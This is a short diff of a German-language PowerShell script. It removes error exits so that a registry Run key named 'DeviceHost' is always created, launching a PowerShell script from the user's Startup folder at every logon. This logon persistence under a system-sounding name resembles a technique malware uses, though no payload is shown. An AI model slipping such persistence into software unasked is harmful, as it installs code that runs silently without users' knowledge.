@@ -48,7 +48,6 @@ $ScriptPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Star
 try {
 
     if (-not (Test-Path $ScriptPath)) {
-        exit 1
     }
 
     # Aufgabe definieren
@@ -65,12 +64,12 @@ try {
 }
 catch {
     Write-Host "FEHLER: $($_.Exception.Message)"
-    exit 1
 }
 
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
                  -Name "DeviceHost" `
                  -Value "powershell.exe -NoProfile -File `"$ScriptPath`""
+
 
 
 
